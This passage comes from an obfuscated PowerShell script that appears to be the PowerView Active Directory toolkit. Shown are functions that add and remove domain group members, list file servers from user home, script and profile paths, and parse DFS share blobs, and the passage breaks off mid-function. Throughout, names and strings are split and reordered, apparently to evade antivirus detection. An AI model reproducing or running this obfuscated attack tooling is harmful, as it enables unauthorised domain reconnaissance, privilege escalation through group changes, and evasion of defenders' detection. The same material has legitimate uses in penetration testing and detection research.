                        ${UsER`IDEnt`ItY} = ${USer`CONt`e`XT}."IDEn`T`ITY"
                    }
                }
                else {
                    ${UsE`RcON`T`Ext} = ${GRoUp`c`On`Te`xT}
                    ${u`seRi`dE`NTiTY} = ${MeM`B`Er}
                }
                &("{0}{2}{3}{1}" -f 'Write-','se','Ver','bo') ('['+'A'+'d'+'d-Dom'+'ainGr'+'oupMemb'+'er] '+'Addi'+'n'+'g '+'m'+'em'+'ber '+"'$Member' "+'t'+'o '+'gr'+'oup '+"'$Identity'")
                ${Me`MB`Er} = [System.DirectoryServices.AccountManagement.Principal]::("{1}{3}{0}{2}"-f 'yI','F','dentity','indB').Invoke(${useRconT`E`XT}."c`oNtEXt", ${use`R`IdEn`TItY})
                ${g`R`OUp}."m`EmB`eRS".("{1}{0}" -f 'dd','A').Invoke(${me`m`Ber})
                ${GrO`UP}.("{1}{0}" -f 'e','Sav').Invoke()
            }
        }
    }
}


function re`mo`VE-DoMaiNGRo`U`PMEMBER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{4}{2}" -f 'PSSh','o','ss','uld','Proce'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTIoN = 0, mAndATOry = ${t`RUe})]
        [Alias({"{2}{0}{1}" -f'Nam','e','Group'}, {"{2}{0}{1}{3}"-f 'r','oup','G','Identity'})]
        [String]
        ${IdE`NT`itY},

        [Parameter(ManDatORY = ${tr`Ue}, valuEfROMpIpELine = ${TR`Ue}, VaLueFrOMpIPelInebyPROpertYNAME = ${T`Rue})]
        [Alias({"{0}{1}{2}"-f 'MemberIde','nt','ity'}, {"{0}{1}"-f'M','ember'}, {"{1}{3}{0}{2}{4}"-f 'ngui','D','sh','isti','edName'})]
        [String[]]
        ${MEmB`ERS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`omA`iN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RED`EntI`Al} =  $21Gv7E::"e`mPty"
    )

    BEGIN {
        ${C`O`NtE`x`TargUMEntS} = @{
            ("{1}{0}" -f 'ity','Ident') = ${iDE`NT`iTY}
        }
        if (${PsBOUndpA`RAM`E`Ters}[("{0}{1}"-f'Doma','in')]) { ${C`Ont`EXTAr`gUmeN`TS}[("{1}{0}"-f 'in','Doma')] = ${Doma`In} }
        if (${PSbouN`dPaRaM`E`T`eRS}[("{1}{0}{2}" -f 'd','Cre','ential')]) { ${CONT`eX`TaR`GU`MENTs}[("{2}{1}{0}" -f'ial','t','Creden')] = ${cR`E`DenTIal} }

        ${g`RouPCo`N`T`eXT} = &("{0}{4}{1}{2}{3}{5}" -f'Get-','ip','al','Cont','Princ','ext') @ContextArguments

        if (${gr`oUpCO`N`TeXt}) {
            try {
                ${g`RoUP} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{2}{0}{1}" -f 'indBy','Identity','F').Invoke(${G`R`ouPCOnT`Ext}."c`on`TEXt", ${GR`O`UPc`ON`TExt}."Id`E`NTiTY")
            }
            catch {
                &("{0}{2}{3}{4}{1}" -f 'Wri','ng','te','-War','ni') ('[R'+'emove'+'-Do'+'ma'+'in'+'GroupMemb'+'er] '+'Erro'+'r '+'f'+'ind'+'ing '+'the'+' '+'gr'+'oup '+'ident'+'it'+'y '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if (${G`RoUp}) {
            ForEach (${mEm`BEr} in ${mem`BeRS}) {
                if (${me`MB`Er} -match ((("{2}{3}{0}{1}"-f'2m.','+','.+o','2mo')) -repLAce  'o2m',[Char]92)) {
                    ${C`ONTEXt`ArGUme`Nts}[("{0}{1}" -f 'Ide','ntity')] = ${m`eMbEr}
                    ${uSer`C`onT`Ext} = &("{3}{4}{1}{0}{2}" -f'ont','-PrincipalC','ext','Ge','t') @ContextArguments
                    if (${uSe`RCo`N`TExT}) {
                        ${Use`R`iDe`NtI`Ty} = ${u`sErCon`T`ExT}."ID`entITy"
                    }
                }
                else {
                    ${Us`E`RcontExt} = ${g`RoupcO`N`T`exT}
                    ${uSeR`IDE`N`Ti`Ty} = ${M`EMber}
                }
                &("{0}{3}{1}{2}" -f 'W','r','bose','rite-Ve') ('[Re'+'mov'+'e-D'+'o'+'m'+'ainGro'+'upMe'+'mber] '+'Remo'+'vin'+'g '+'mem'+'ber '+"'$Member' "+'from'+' '+'g'+'roup '+"'$Identity'")
                ${M`e`mBER} = [System.DirectoryServices.AccountManagement.Principal]::("{2}{3}{0}{1}"-f'en','tity','F','indById').Invoke(${uSeR`C`ONtEXt}."C`OntEXt", ${use`RId`EnTI`Ty})
                ${Gro`Up}."meMb`ERs".("{1}{0}"-f'e','Remov').Invoke(${m`e`MBeR})
                ${Gr`ouP}.("{0}{1}"-f 'S','ave').Invoke()
            }
        }
    }
}


function G`ET-`DOmAInFIlES`ErVER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{4}{2}{1}"-f'PS','ss','roce','Sho','uldP'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( VaLueFroMpipELINE = ${TR`Ue}, VALuEfROMpipELinEbYPrOpertYname = ${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{1}" -f 'omainN','e','D','am'}, {"{0}{1}" -f 'Na','me'})]
        [String[]]
        ${d`OM`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'r','F','ilte'})]
        [String]
        ${ldA`pf`ilTER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'ADSP','ath'})]
        [String]
        ${SearCh`Ba`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{0}" -f'oller','Dom','ainC','ontr'})]
        [String]
        ${seRv`ER},

        [ValidateSet({"{0}{1}" -f'Ba','se'}, {"{0}{1}{2}" -f'One','Leve','l'}, {"{1}{0}" -f 'ree','Subt'})]
        [String]
        ${SeAr`c`hsC`opE} = ("{1}{0}" -f'ee','Subtr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEs`ULTpag`e`s`Ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`eR`Ver`TiMEli`mIT},

        [Switch]
        ${t`o`MB`StOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`E`dENtIAl} =   (gi  variaBLE:21GV7e).VaLUe::"eMP`TY"
    )

    BEGIN {
        function spL`I`T-pAth {
            
            Param([String]${PA`TH})

            if (${p`ATh} -and (${Pa`Th}.("{0}{1}" -f'spl','it').Invoke('\\')."CO`UNt" -ge 3)) {
                ${t`EmP} = ${p`ATh}.("{1}{0}"-f'plit','s').Invoke('\\')[2]
                if (${T`EmP} -and (${Te`mP} -ne '')) {
                    ${Te`MP}
                }
            }
        }

        ${SE`A`RC`herArGUM`Ents} = @{
            ("{2}{1}{0}" -f'ter','il','LDAPF') = ((("{4}{14}{15}{13}{2}{20}{0}{10}{26}{29}{1}{31}{3}{23}{6}{28}{34}{16}{22}{32}{27}{7}{35}{25}{30}{17}{24}{21}{11}{9}{5}{18}{12}{8}{19}{33}" -f '6','e','=805','ou','(&(s',')(pro','.2','o','=','tpath=*','36','crip','ilepath','ype','am','AccountT','1.4.803:','y','f','*','30','*)(s','=2','ntControl:1','=','ire','8','({0}(h','.',')(!(us','ctor','rAcc','))',')))','840.113556.','med'))-f [cHAr]124)
            ("{0}{1}{2}" -f 'Pro','per','ties') = ("{5}{2}{7}{1}{3}{6}{0}{4}" -f 'ofile','y,scriptpat','edirec','h,p','path','hom','r','tor')
        }
        if (${Psbo`UNdP`ArA`meT`Ers}[("{0}{1}{2}" -f 'Sea','rchBa','se')]) { ${sE`A`RcHERa`R`GUMen`TS}[("{2}{0}{1}"-f'archBa','se','Se')] = ${sEA`Rc`hb`Ase} }
        if (${P`Sb`O`UnDparA`mE`TerS}[("{0}{1}"-f'S','erver')]) { ${Se`ARCHEra`RG`U`MenTs}[("{0}{2}{1}" -f 'S','er','erv')] = ${SE`RVER} }
        if (${pSbOuN`dP`ARaME`Ters}[("{0}{1}{3}{2}"-f'Se','arch','ope','Sc')]) { ${SE`A`RCheR`ArGUmeNTs}[("{1}{0}{3}{2}" -f'ear','S','cope','chS')] = ${sE`A`RcHsCOpE} }
        if (${PS`BounD`p`ARAMe`TeRS}[("{3}{2}{1}{0}"-f'e','eSiz','ltPag','Resu')]) { ${s`E`ARche`RArg`UmeNTs}[("{3}{0}{1}{2}" -f 'esul','tPage','Size','R')] = ${REsU`Ltpage`Si`zE} }
        if (${psbo`UND`Pa`RaMeT`ers}[("{0}{1}{2}{4}{3}"-f'Ser','v','e','it','rTimeLim')]) { ${SEa`Rch`erArgUMeN`TS}[("{1}{0}{2}"-f 'ime','ServerT','Limit')] = ${seRvERtI`m`e`lImIT} }
        if (${pSB`OuN`DpAr`AmET`erS}[("{0}{1}"-f'Tombsto','ne')]) { ${SeARcHE`R`A`Rg`UMeN`TS}[("{1}{2}{0}"-f 'ne','T','ombsto')] = ${toMb`sT`oNE} }
        if (${P`S`B`OUNdPaRAmeters}[("{2}{3}{0}{1}"-f'i','al','Cre','dent')]) { ${searc`he`RAr`GumeNTS}[("{0}{2}{1}" -f'Crede','tial','n')] = ${Cre`d`eNTIAL} }
    }

    PROCESS {
        if (${p`SbO`UnDP`ARAME`Ters}[("{0}{1}{2}"-f'D','om','ain')]) {
            ForEach (${tAr`getdo`maiN} in ${dom`AIn}) {
                ${SEARcHEr`A`RguM`ENTS}[("{2}{1}{0}"-f'ain','m','Do')] = ${tarGe`TdO`M`Ain}
                ${USERse`A`RcH`eR} = &("{1}{5}{4}{3}{2}{0}" -f 'er','Get-D','rch','a','nSe','omai') @SearcherArguments
                
                $(ForEach(${Us`e`RResULt} in ${U`sE`RSEaR`cHer}.("{1}{2}{0}" -f 'l','Find','Al').Invoke()) {if (${Us`Er`ReSult}."PrOPER`TI`Es"[("{1}{0}{2}{3}"-f 'med','ho','irector','y')]) {&("{0}{1}{2}" -f'Split','-','Path')(${USe`R`Res`ULt}."PR`opERTi`es"[("{1}{2}{0}" -f 'ory','homedir','ect')])}if (${usE`R`ReSUlT}."pr`o`PerTiES"[("{1}{0}{2}" -f 'tpat','scrip','h')]) {&("{3}{2}{0}{1}" -f'a','th','t-P','Spli')(${US`errE`suLT}."prOPe`Rt`IeS"[("{2}{1}{0}" -f'path','ipt','scr')])}if (${UseRR`E`SU`lt}."prOP`e`RTies"[("{0}{1}{2}"-f'p','rofilep','ath')]) {&("{1}{0}{2}" -f'plit','S','-Path')(${uS`eR`ResU`LT}."p`RO`PERTiES"[("{0}{3}{2}{1}"-f'p','filepath','o','r')])}}) | &("{1}{0}{3}{2}" -f'or','S','Object','t-') -Unique
            }
        }
        else {
            ${uSER`S`eaRc`HeR} = &("{2}{0}{3}{1}" -f 'nSear','her','Get-Domai','c') @SearcherArguments
            $(ForEach(${u`serR`esUlT} in ${Us`Er`sEaRcH`Er}.("{1}{0}{2}" -f'indAl','F','l').Invoke()) {if (${UseR`R`EsuLt}."PrO`Pe`RTies"[("{1}{0}{3}{2}" -f 'c','homedire','y','tor')]) {&("{2}{1}{3}{0}"-f'h','lit','Sp','-Pat')(${us`eRR`E`SulT}."PrOPe`R`TIes"[("{1}{2}{0}"-f'ctory','h','omedire')])}if (${UseRr`ES`Ult}."pR`OPErtI`Es"[("{3}{1}{2}{0}" -f 'h','ptpa','t','scri')]) {&("{2}{1}{0}" -f'Path','plit-','S')(${use`R`REs`ULt}."Pr`o`per`TIeS"[("{2}{0}{1}"-f 'criptpa','th','s')])}if (${US`E`RrE`SUlt}."PR`Op`e`RTIES"[("{3}{0}{1}{2}" -f 'le','p','ath','profi')]) {&("{0}{1}{2}"-f 'Sp','lit-','Path')(${u`SEr`R`esUlT}."pR`oper`TiEs"[("{0}{1}{3}{2}" -f 'profi','le','th','pa')])}}) | &("{1}{2}{0}" -f 'ct','S','ort-Obje') -Unique
        }
    }
}


function GET-DO`MaiNDf`sshA`Re {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{4}{3}" -f 'P','c','SShouldPro','ss','e'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{6}{1}{2}{7}{0}{4}{5}"-f 'nA','edVarsMor','e','PSUse','ssignment','s','Declar','Tha'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{4}{2}"-f'UseAppr','P','bs','S','ovedVer'}, '')]
    [OutputType({"{8}{0}{2}{5}{6}{9}{3}{11}{7}{1}{4}{10}{12}" -f'te','usto','m.','ma','mOb','Man','age','.PSC','Sys','ment.Auto','je','tion','ct'})]
    [CmdletBinding()]
    Param(
        [Parameter( ValuEfrOMpIPELINE = ${tr`UE}, ValUeFRomPIpELiNebypRoPERtyNAMe = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{1}{0}" -f'e','Nam','Doma','in'}, {"{0}{1}"-f'Na','me'})]
        [String[]]
        ${dOM`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'ath','ADSP'})]
        [String]
        ${SE`Ar`CHb`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}" -f 'r','omainCon','D','trolle'})]
        [String]
        ${SE`RveR},

        [ValidateSet({"{1}{0}"-f'e','Bas'}, {"{0}{1}{2}" -f'OneLe','v','el'}, {"{1}{0}"-f 'btree','Su'})]
        [String]
        ${S`eARChSc`o`pE} = ("{0}{1}{2}" -f 'Su','btr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RESUlTPag`E`S`i`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`er`VeRTIMeLim`it},

        [Switch]
        ${to`m`BS`Tone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRedENT`I`Al} =   (VARIaBle  21GV7E).vALUE::"Em`Pty",

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        ${VeR`S`iON} = 'All'
    )

    BEGIN {
        ${sEA`RCH`ERAR`GUMen`TS} = @{}
        if (${PSBOun`d`pAra`MEteRS}[("{0}{2}{1}{3}" -f'Se','h','arc','Base')]) { ${sEAR`CHeR`A`R`GUmenTS}[("{0}{1}{2}"-f'Sear','ch','Base')] = ${SeaR`Ch`BaSe} }
        if (${psB`o`UnD`Par`AmetE`Rs}[("{2}{0}{1}" -f 'erve','r','S')]) { ${seArCH`e`RarGuM`enTs}[("{1}{0}{2}"-f 'er','S','ver')] = ${SER`VEr} }
        if (${pS`Bou`Nd`pAr`Ame`Ters}[("{3}{2}{1}{0}"-f 'ope','chSc','ear','S')]) { ${SeA`RCh`eRa`RgUm`enTS}[("{2}{0}{3}{1}" -f 'ch','cope','Sear','S')] = ${sEArch`ScO`Pe} }
        if (${Ps`BO`UNDPAR`AMETERS}[("{2}{3}{0}{1}"-f'geSiz','e','Res','ultPa')]) { ${sE`ARC`HeRArgU`MeNTS}[("{0}{2}{1}{3}"-f 'Res','Pa','ult','geSize')] = ${R`ESuL`TpAGES`iZe} }
        if (${pSbO`UnDp`ARaME`T`e`RS}[("{3}{2}{1}{0}" -f 'Limit','me','erTi','Serv')]) { ${sEA`R`cheRar`gumENTS}[("{0}{1}{2}{3}"-f'Serv','e','rTimeLimi','t')] = ${s`ervE`R`TiMElIMiT} }
        if (${psb`Ou`NDpaRA`metE`Rs}[("{1}{0}{2}" -f 'bst','Tom','one')]) { ${sE`ArChErar`GumE`NTs}[("{1}{0}{2}"-f'm','To','bstone')] = ${Tom`BS`Tone} }
        if (${PSB`oU`NDPA`RAMETeRS}[("{1}{2}{0}" -f 'ial','Crede','nt')]) { ${sEaRc`h`EraRguM`e`NtS}[("{2}{1}{0}" -f'l','entia','Cred')] = ${cRed`e`NtIAl} }

        function PA`RSE-`PKt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${p`Kt}
            )

            ${B`iN} = ${P`kT}
            ${b`loB_VERsI`oN} =  $2eMqh6::"T`oUi`NT32"(${b`In}[0..3],0)
            ${b`l`OB_elemeNt_CO`U`Nt} =  $2emQh6::"tOu`int32"(${b`In}[4..7],0)
            ${o`Ff`sET} = 8
            
            ${o`Bj`ecT`_List} = @()
            for(${i}=1; ${I} -le ${BLO`B_`ELem`enT_cou`Nt}; ${i}++){
                ${B`Lo`B_nA`Me_SIze_STarT} = ${O`F`FSET}
                ${BLO`B_`N`Am`e_SIZE`_enD} = ${offS`eT} + 1
                ${B`LOb`_N`AmE_size} =   ( Dir ("VAr"+"i"+"ablE:2E"+"Mq"+"H6")).VAlUe::"To`U`iNt16"(${B`In}[${BloB_n`A`M`e_siZE_StARt}..${Blob`_Name_S`iZE`_E`Nd}],0)

                ${bL`ob_`NamE`_s`Tart} = ${B`loB_Name`_sI`ze_END} + 1
                ${B`lOb_`N`AME`_enD} = ${BLO`B`_Na`m`e_staRt} + ${BLo`B`_n`AME_s`izE} - 1
                ${BLoB`_`NAme} =  (  VArIABLE ('ua'+'0'+'5x3') -vALUEon  )::"uN`IcO`DE"."G`e`TstRI`Ng"(${B`IN}[${BLOB`_naM`e`_sTArt}..${BlO`B`_`NaMe_ENd}])

                ${BLo`B_Data`_S`Ize_ST`Art} = ${B`Lob`_naMe_E`ND} + 1
                ${B`lob_`daT`A`_`sizE_eND} = ${blO`B_DaTA`_si`ZE_Start} + 3
                ${BLo`B`_daTa`_Size} =  $2eMqH6::"TOU`int32"(${b`in}[${B`LOb`_dATA_SIZ`e_STA`RT}..${b`LOb_datA_S`I`z`E_`eNd}],0)

                ${B`l`ob_dATa_st`A`RT} = ${blob_D`A`TA`_S`izE_`ENd} + 1
                ${bLoB`_D`ATa_E`Nd} = ${BL`O`B`_DatA_STart} + ${bLoB_Data`_`SI`ZE} - 1
                ${b`LOB`_dATa} = ${b`iN}[${BloB_d`A`T`A_`sTaRt}..${B`lOB`_`data_enD}]
                switch -wildcard (${B`lob_n`Ame}) {
                    ((("{0}{1}"-f'{0}','siteroot')) -f  [chAr]92) {  }
                    ((("{1}{2}{0}{3}"-f 'root','hAU','domain','*')) -REPlacE([CHAr]104+[CHAr]65+[CHAr]85),[CHAr]92) {
                        
                        
                        ${rOo`T_oR`_LinK_`gUId`_St`A`RT} = 0
                        ${R`oot_`Or_L`InK_gUid`_E`Nd} = 15
                        ${r`OOt`_O`R_LinK_`g`UId} = [byte[]]${b`lOb`_dA`TA}[${rO`oT_o`R_lInk_`GU`ID_sTaRT}..${RO`Ot_`Or_lInk_`G`U`ID_eNd}]
                        ${G`UiD} = &("{0}{2}{1}" -f'New-','t','Objec') ("{1}{0}" -f'id','Gu')(,${ROOt_oR_`LiN`K_`G`U`ID}) 
                        ${PReFix_`Size_`sta`Rt} = ${rOO`T_oR_`l`INk_`gUID`_E`Nd} + 1
                        ${P`REF`i`x_S`Ize_e`Nd} = ${preFI`x`_SI`z`e_st`ARt} + 1
                        ${PR`EfiX`_S`IzE} =   (  vaRiABlE ("2"+"EM"+"Qh6")  -vAlUe)::"TOu`inT16"(${B`lOb`_DATA}[${P`Refi`x_`SiZE_s`Ta`RT}..${p`REfi`X_`SiZE`_End}],0)
                        ${PR`E`FiX`_`STart} = ${PRE`FIx`_s`iZE_e`ND} + 1
                        ${pReFi`X_`EnD} = ${pRe`FiX_St`ArT} + ${pre`Fix`_s`IZE} - 1
                        ${pR`E`Fix} =  (vAriABLe  ('uA0'+'5'+'X3') -VAlU  )::"uN`IC`ode"."g`eTsTr`iNG"(${b`LOb_da`TA}[${P`R`e`FIx_St`ArT}..${PrEfi`X_`E`ND}])

                        ${S`hOr`T_PR`efI`X_SIz`e_St`Art} = ${pRe`F`Ix_ENd} + 1
                        ${SHoRT_`p`RE`Fix_`siZe`_enD} = ${S`HOr`T_p`ReF`Ix`_SIZ`e_STa`RT} + 1
                        ${SHo`R`T_pREfix_s`IZe} =  (gi varIABLE:2Emqh6  ).vaLuE::"tOu`INT16"(${bLoB_`D`Ata}[${s`ho`Rt_P`REfIx_`SIZE_St`ArT}..${ShOrT_`preFIx_S`I`Ze`_`EnD}],0)
                        ${Sh`OR`T`_preF`ix_s`Tart} = ${ShorT`_Pr`EFix`_sIze`_`e`Nd} + 1
                        ${S`ho`RT_PrE`FIX_`eND} = ${Sho`RT_p`REf`Ix_StA`Rt} + ${SHo`Rt`_P`RE`Fix_SIzE} - 1
                        ${sHoRt_pR`EF`ix} =   $ua05x3::"unI`c`ode"."geT`sTRI`Ng"(${b`Lob_`dATA}[${shor`T_pR`eFiX_S`T`ARt}..${s`HoR`T`_`PrEfIX_`End}])

                        ${TYP`E_ST`ArT} = ${SHo`RT`_P`RE`F`IX_end} + 1
                        ${t`ype_E`ND} = ${Ty`Pe`_sTArT} + 3
                        ${T`YpE} =   (  dIR  ('VaRi'+'abLE:'+'2eMqh6')  ).ValUE::"touiN`T`32"(${b`loB_d`Ata}[${TYPe`_`sTaRT}..${TYPe_`E`Nd}],0)

                        ${ST`AtE_s`Ta`Rt} = ${tY`pE_e`ND} + 1
                        ${S`T`Ate_EnD} = ${ST`AtE_s`TArt} + 3
                        ${s`Tate} =   (  GeT-vaRIabLE  2eMqH6 -va  )::"tOuInt`32"(${BLo`B`_DATA}[${stA`Te_`stA`RT}..${ST`A`TE`_End}],0)

                        ${COm`meNT`_sI`ZE_Sta`Rt} = ${STAt`E`_`END} + 1
                        ${c`omMe`N`T_sizE_END} = ${CoM`MeN`T_s`izE_`s`T`Art} + 1
                        ${coM`MEnt`_sI`zE} =  (dIR  ("vARIAb"+"Le:2Emq"+"H6") ).ValUE::"To`UiNt`16"(${BLoB_`D`Ata}[${co`MMEnt`_SIZ`e_StARt}..${commeNt_S`i`Ze`_`E`ND}],0)
                        ${Co`mmE`NT_stART} = ${Com`M`E`NT_S`IZE_END} + 1
                        ${c`OmMEN`T_eNd} = ${COM`MEnT_`sTArT} + ${C`oM`ME`NT_sI`ZE} - 1
                        if (${C`Om`MeNt`_S`izE} -gt 0)  {
                            ${ComM`e`Nt} =  $uA05x3::"uNiC`O`de"."g`etsT`RIng"(${Blo`B_dA`TA}[${CoMM`E`NT_`STA`Rt}..${Co`MmENt`_`End}])
                        }
                        ${p`ReFIX`_tiMesta`M`p_`sTaRT} = ${c`o`mmEnT_enD} + 1
                        ${PRE`FIx_T`ImESTAmp`_end} = ${PrEF`Ix_`TImestam`p_`STa`Rt} + 7
                        
                        ${pR`Efix`_t`iMestA`Mp} = ${B`Lob`_Data}[${pR`e`F`IX_timeStA`Mp_s`TArT}..${prE`FiX_time`sTA`mP`_ENd}] 
                        ${sta`Te`_tim`ESTA`mP_S`Tart} = ${P`RE`Fi`X_t`i`mEsTaMp_end} + 1
                        ${STaT`e_`TImE`STA`MP_enD} = ${STAt`e_Tim`eStAm`P_`StARt} + 7
                        ${S`TATE`_`TimEStAMp} = ${B`Lo`B`_dAta}[${StAtE`_`T`ImEst`AMp_stArT}..${STAtE`_`T`IMEstAM`P_end}]
                        ${CO`M`MeNt_tIme`ST`AMP_starT} = ${StAt`E_T`ImEsT`AMp_EnD} + 1
                        ${cO`mMEnt_`TiM`es`TaMp_eNd} = ${coMm`E`N`T`_Ti`me`stAMP_s`TarT} + 7
                        ${COmMEn`T_Ti`M`ES`TaMp} = ${b`L`oB`_DaTA}[${CommEnt_tIM`E`sTaMp_`STA`Rt}..${CO`MMEnt_T`ime`STAm`p`_eNd}]
                        ${V`erSion_`S`TaRt} = ${cOMM`eN`T_TIMe`ST`A`M`p_ENd}  + 1
                        ${veR`SIon`_`end} = ${VerS`Io`N_StArT} + 3
                        ${V`e`RSIOn} =   ( GeT-VaRiabLE  2EMqH6  ).vAluE::"t`OUINt32"(${bl`ob_d`ATA}[${vERs`Ion_s`TArT}..${VeRSioN`_e`ND}],0)

                        
                        ${dFs_T`Ar`ge`T`lIst_b`L`oB_S`ize_`sTA`RT} = ${V`ersIo`N`_EnD} + 1
                        ${dFs_TaRGe`T`LiSt_b`Lo`B_`sIze_eNd} = ${dFS_ta`RG`EtLI`ST`_`B`Lo`B_SizE`_StART} + 3
                        ${dFS`_t`A`RGe`TliST_`BLoB_SiZe} =   (  vaRIAblE ("2Emq"+"h6")  -vAluEo  )::"tOu`in`T32"(${BLoB_d`A`Ta}[${dFs_T`A`R`GetlIs`T_`BloB_`sIzE_sTa`Rt}..${dfs`_Ta`RgeT`L`isT`_bloB`_S`i`Ze_ENd}],0)

                        ${df`s_`TaRgEt`lIst`_blo`B`_`StarT} = ${dfs`_tAr`GEt`LiSt_BlOb_S`i`ze_eND} + 1
                        ${dfS_TARGE`T`l`IsT_BLOB_E`Nd} = ${DF`s_TA`R`g`EtliS`T_`BL`ob_s`TArt} + ${DFs_`TArge`TlI`s`T_blOb_sIZe} - 1
                        ${dfS_TarGet`LIs`T_`B`lOb} = ${b`l`ob_DAta}[${d`Fs_TarGE`TlIST_bL`O`B`_ST`ARt}..${Dfs_Ta`RGe`T`lISt_B`lob_`End}]
                        ${R`E`S`e`RVeD_blOb_`sIZe_STaRt} = ${dFs`_TARGET`List`_`BlOb_End} + 1
                        ${Re`Se`R`VEd_bl`Ob_sIZ`E_e`Nd} = ${REs`er`VEd`_B`loB_siZe`_St`ArT} + 3
                        ${rE`serv`ED_Bl`O`B_sIZe} =  (vARIAblE 2emqH6  ).vAluE::"t`OuINt`32"(${blO`B_`daTa}[${r`ESErVeD`_`Blo`B_siZe`_STart}..${RE`Se`RVED_bloB_SIz`E_EnD}],0)

                        ${rEser`V`ED`_bl`OB_St`ArT} = ${R`ES`ER`V`E`D_blOB`_SiZ`e_enD} + 1
                        ${ReSeRVED`_BlOB`_`EnD} = ${rEs`erveD_b`Lo`B_STArT} + ${Re`S`ErveD_blob`_Size} - 1
                        ${r`eS`eRVed`_bLob} = ${bLob_`Da`Ta}[${RESE`Rved`_BloB_`St`Art}..${r`eSe`RvE`d`_BLo`B_End}]
                        ${rE`F`ER`RAl_TT`L_StART} = ${reSeRved_`Bl`O`B`_`End} + 1
                        ${REfERrAL_`T`TL`_end} = ${rE`F`err`AL_T`Tl_sTARt} + 3
                        ${re`FeRr`A`L_T`Tl} =   (gEt-VarIAblE  2EmqH6  ).value::"TOu`I`NT32"(${bloB_`d`ATa}[${rE`FErr`Al`_tT`l_`STArt}..${rE`FERR`A`L_tTl_e`Nd}],0)

                        
                        ${tARGE`T_`c`oU`Nt_STArT} = 0
                        ${TargE`T_co`UNT`_end} = ${Tar`ge`T_CoUN`T_STa`RT} + 3
                        ${tar`G`eT_`couNt} =  (vaRIAble 2EMQh6).VaLUE::"TOu`inT`32"(${DFS`_TArGET`lIst_b`LOB}[${t`Arg`et_COUN`T_s`T`ARt}..${taRG`E`T_`counT_ENd}],0)
                        ${t_O`Ffs`et} = ${tar`G`Et_c`ou`Nt_`enD} + 1

                        for(${j}=1; ${J} -le ${t`ArGeT`_co`U`NT}; ${J}++){
                            ${TA`RGeT_eNTry_siZ`E_`sta`Rt} = ${T_`OfFS`eT}
                            ${ta`R`GEt_enTR`y_siZE_END} = ${t`ARGeT`_`e`NtRy_`SIZe_STa`RT} + 3
                            ${Ta`RG`ET_En`TRY`_Si`zE} =  (  diR  ('V'+'aRI'+'ablE'+':2emQ'+'h6')).vaLUe::"t`OUiNt32"(${dFS`_T`Arg`EtL`isT_bloB}[${tARG`ET_entR`Y_`siZE_`s`Ta`RT}..${targET_Entr`y_`SizE`_`EnD}],0)
                            ${TAr`GET_tImE_Sta`Mp`_`s`TA`RT} = ${TARg`et_en`TRY_siz`e_`ENd} + 1
                            ${T`ArGet_T`i`me_StaMP_`END} = ${tARG`Et_Tim`e_St`AM`p_STa`Rt} + 7
                            
                            ${ta`Rg`E`T_tI`Me_sTa`mP} = ${DFS`_tarGe`Tli`St_Bl`OB}[${ta`RG`E`T_tImE_stAmp_s`TarT}..${TaRgE`T`_t`iM`E_STAmp_e`Nd}]
                            ${tAr`g`e`T`_stAT`e_STa`Rt} = ${t`A`R`GeT`_TImE`_StaM`P_eND} + 1
                            ${targ`et_St`A`Te_END} = ${t`ArGEt_`Sta`TE_St`Art} + 3
                            ${T`AR`GET_sTate} =   ( gi VarIAbLe:2EmqH6  ).VaLuE::"t`OUINt32"(${Df`S_tAr`ge`TlIS`T_blOb}[${tar`GEt_S`TAte_`stARt}..${t`ARG`ET`_state_EnD}],0)

                            ${tArGET_`T`yPE`_ST`ARt} = ${taRg`ET_`sTAtE_e`Nd} + 1
                            ${TARgE`T`_typ`E`_eNd} = ${tARgeT_tYp`E_ST`A`RT} + 3
                            ${TARg`E`T_typE} =   $2EMqh6::"to`UinT32"(${dFs_t`ArG`etLI`S`T_BlOb}[${t`ArG`Et_`Type_START}..${TAr`g`et_Typ`e_e`ND}],0)

                            ${SeRveR_N`A`ME_siZ`E_`S`TArT} = ${tarG`e`T_t`YP`e_end} + 1
                            ${S`Er`VEr`_Name`_sizE_end} = ${SERVEr_na`m`E_S`iZE_`S`TaRt} + 1
                            ${sE`Rv`eR`_name_Size} =   (  gi  vARIAbLE:2emQh6  ).ValUE::"tO`U`Int16"(${D`F`s_`TARgETlISt_BlOB}[${seR`V`er_n`AM`e_`SI`Z`E_sTARt}..${SErvER_NaME`_`SI`ZE_End}],0)

                            ${sErV`ER_`N`AmE_Sta`Rt} = ${SeRver`_NA`M`E_sIz`e_enD} + 1
                            ${sERv`E`R_`NAME_`EnD} = ${Se`RV`eR_naMe`_StaRT} + ${SERVE`R_n`AmE_s`I`ZE} - 1
